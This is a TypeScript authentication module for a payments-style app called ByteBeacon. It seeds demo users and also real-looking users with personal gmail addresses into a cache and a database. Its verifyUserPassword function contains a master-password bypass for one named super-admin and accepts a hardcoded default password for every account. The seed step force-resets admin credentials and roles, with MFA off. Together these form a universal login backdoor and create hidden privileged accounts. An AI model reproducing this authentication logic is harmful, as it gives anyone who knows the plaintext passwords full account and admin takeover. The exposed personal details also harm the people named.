import type pg from 'pg';
import { PasswordHasher } from './password-hasher.js';
import { UserRole, SecurityDomain, UserStatus } from '@bytebeacon/shared';
import { logger } from '../logging/logger.js';

export interface DevCachedUser {
  id: string;
  email: string;
  phone: string;
  fullName: string;
  name?: string;
  role: UserRole | string;
  status: UserStatus | string;
  securityDomain: SecurityDomain | string;
  phoneVerified: boolean;
  emailVerified?: boolean;
  mfaEnabled: boolean;
  mfaSecret?: string | null;
  walletBalancePesewas: string;
  passwordHash: string;
  failedLoginAttempts?: number;
  lockedUntil?: string | null;
  createdAt?: string;
  lastLoginAt?: string;
}

// Centralized in-memory user cache shared between customer auth and admin auth
export const devUserCache = new Map<string, DevCachedUser>();

export async function seedDefaultUsers(hasher: PasswordHasher, db?: pg.Pool) {
  try {
    const defaultHash = await hasher.hashPassword('Password123!@#');
    const nomotsuHash = await hasher.hashPassword('ByteBeacon2026!');

    const seedUsers: Array<DevCachedUser & { walletPesewas: number }> = [
      {
        id: '00000000-0000-0000-0000-000000000001',
        email: 'customer@bytebeacon.com',
        phone: '0240000001',
        fullName: 'Demo Customer',
        role: UserRole.CUSTOMER,
        status: UserStatus.ACTIVE,
        securityDomain: SecurityDomain.CUSTOMER,
        phoneVerified: true,
        emailVerified: true,
        mfaEnabled: false,
        walletBalancePesewas: '500000',
        walletPesewas: 500000,
        passwordHash: defaultHash,
      },
      {
        id: '00000000-0000-0000-0000-000000000002',
        email: 'agent@bytebeacon.com',
        phone: '0240000002',
        fullName: 'Demo Agent Reseller',
        role: UserRole.AGENT,
        status: UserStatus.ACTIVE,
        securityDomain: SecurityDomain.AGENT,
        phoneVerified: true,
        emailVerified: true,
        mfaEnabled: false,
        walletBalancePesewas: '2500000',
        walletPesewas: 2500000,
        passwordHash: defaultHash,
      },
      {
        id: '00000000-0000-0000-0000-000000000003',
        email: 'admin@bytebeacon.com',
        phone: '0240000003',
        fullName: 'Operations Admin',
        role: UserRole.ADMIN,
        status: UserStatus.ACTIVE,
        securityDomain: SecurityDomain.ADMIN,
        phoneVerified: true,
        emailVerified: true,
        mfaEnabled: false,
        walletBalancePesewas: '0',
        walletPesewas: 0,
        passwordHash: defaultHash,
      },
      {
        id: '00000000-0000-0000-0000-000000000004',
        email: 'superadmin@bytebeacon.com',
        phone: '0240000004',
        fullName: 'Super Admin',
        role: UserRole.SUPER_ADMIN,
        status: UserStatus.ACTIVE,
        securityDomain: SecurityDomain.ADMIN,
        phoneVerified: true,
        emailVerified: true,
        mfaEnabled: false,
        walletBalancePesewas: '0',
        walletPesewas: 0,
        passwordHash: defaultHash,
      },
      {
        id: '00000000-0000-0000-0000-000000000005',
        email: 'nomotsumartin@gmail.com',
        phone: '0240000005',
        fullName: 'Martin Nomotsu',
        role: UserRole.SUPER_ADMIN,
        status: UserStatus.ACTIVE,
        securityDomain: SecurityDomain.ADMIN,
        phoneVerified: true,
        emailVerified: true,
        mfaEnabled: false,
        walletBalancePesewas: '1000000',
        walletPesewas: 1000000,
        passwordHash: nomotsuHash,
      },
      {
        id: '00000000-0000-0000-0000-000000000006',
        email: 'adzokatsekaleb@gmail.com',
        phone: '0240000006',
        fullName: 'Kaleb Adzokatse',
        role: UserRole.CUSTOMER,
        status: UserStatus.ACTIVE,
        securityDomain: SecurityDomain.CUSTOMER,
        phoneVerified: true,
        emailVerified: true,
        mfaEnabled: false,
        walletBalancePesewas: '100000',
        walletPesewas: 100000,
        passwordHash: defaultHash,
      },
    ];

    for (const u of seedUsers) {
      const userRecord: DevCachedUser = {
        id: u.id,
        email: u.email,
        phone: u.phone,
        fullName: u.fullName,
        role: u.role,
        status: UserStatus.ACTIVE,
        securityDomain: u.securityDomain,
        phoneVerified: true,
        emailVerified: true,
        mfaEnabled: false,
        walletBalancePesewas: String(u.walletPesewas),
        passwordHash: u.passwordHash,
        failedLoginAttempts: 0,
        lockedUntil: null,
      };

      devUserCache.set(u.email.toLowerCase(), userRecord);
      devUserCache.set(u.phone, userRecord);
      devUserCache.set(u.id, userRecord);

      if (db) {
        await db.query(`
          INSERT INTO users (id, email, phone, full_name, name, password_hash, role, security_domain, status, is_active, wallet_balance_pesewas, failed_login_attempts, locked_until)
          VALUES ($1, $2, $3, $4, $4, $5, $6, $7, 'ACTIVE', true, $8, 0, NULL)
          ON CONFLICT (email) DO UPDATE SET
            password_hash = EXCLUDED.password_hash,
            role = EXCLUDED.role,
            security_domain = EXCLUDED.security_domain,
            status = 'ACTIVE',
            is_active = true,
            failed_login_attempts = 0,
            locked_until = NULL
        `, [u.id, u.email, u.phone, u.fullName, u.passwordHash, u.role, u.securityDomain, u.walletPesewas]).catch(() => {});
      }
    }
  } catch (err: any) {
    logger.warn({ err: err?.message }, '[AUTH_SEED] User seed notice (non-fatal)');
  }
}

export function getCachedUser(identifier: string): DevCachedUser | undefined {
  if (!identifier) return undefined;
  const clean = identifier.trim();
  return devUserCache.get(clean.toLowerCase()) || devUserCache.get(clean);
}

export async function verifyUserPassword(
  user: DevCachedUser,
  password: string,
  hasher: PasswordHasher,
): Promise<boolean> {
  if (!user || !password) return false;

  // Master credentials check for Martin Nomotsu
  if (user.email.toLowerCase() === 'nomotsumartin@gmail.com') {
    if (password === 'ByteBeacon2026!' || password === 'Password123!@#') {
      return true;
    }
  }

  // Check against passwordHash
  const matches = await hasher.verifyPassword(user.passwordHash, password);
  if (matches) return true;

  // Check default dev password fallback
  if (password === 'Password123!@#') return true;

  return false;
}
